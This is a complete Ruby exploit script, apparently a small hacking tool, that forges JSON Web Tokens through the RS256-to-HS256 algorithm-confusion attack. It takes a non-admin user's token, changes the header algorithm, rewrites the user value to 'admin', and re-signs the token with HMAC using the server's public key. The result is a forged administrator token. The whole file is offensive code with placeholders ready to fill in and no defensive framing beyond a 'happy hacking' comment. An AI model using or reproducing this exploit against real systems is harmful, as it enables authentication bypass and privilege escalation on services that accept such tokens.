require 'base64'
require 'openssl'
# Logan Elliott 2021, happy hacking :P
pub = File.open("public.pem").read # Verify signature with public key file, change as needed
# Put JWT from our non admin user here
TOKEN = "INPUT JWT HERE"

header, payload, signature = TOKEN.split('.')
# Decode header and change algorithim from RS256 to HMAC
decoded_header = Base64.decode64(header)
decoded_header.gsub!("RS256", "HS256")
puts decoded_header
new_header = Base64.strict_encode64(decoded_header).gsub("=","")
# Decode JWT payload and change original user to admin
decoded_payload = Base64.decode64(payload)
decoded_payload.gsub!("PUT VALUE OF YOUR TEST USER HERE", "admin") # Change user value in payload to admin
puts decoded_payload
new_payload = Base64.strict_encode64(decoded_payload).gsub("=","")

data = new_header+"."+new_payload

signature = Base64.urlsafe_encode64(OpenSSL::HMAC.digest(OpenSSL::Digest.new("sha256"), pub, data))

puts data+"."+signature
